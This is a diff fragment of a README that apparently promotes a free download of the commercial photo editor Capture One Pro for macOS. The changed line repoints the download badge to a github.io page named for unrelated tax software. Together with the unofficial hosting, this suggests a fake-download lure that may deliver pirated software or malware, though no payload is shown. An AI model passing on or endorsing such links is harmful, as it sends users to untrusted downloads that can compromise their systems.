@@ -7,7 +7,7 @@ Whether you're shooting fashion, landscapes, or product photography, Capture One
 ---
 
 ## ✅ Download Capture One Pro for macOS  
-[![Download Capture One Pro](https://img.shields.io/badge/Download-Capture_One_Pro-blueviolet)](https://capture-one-pro-mac-download.github.io/.github)
+[![Download Capture One Pro](https://img.shields.io/badge/Download-Capture_One_Pro-blueviolet)](https://taxact-mac-download.github.io/.github)
 
 ---
 
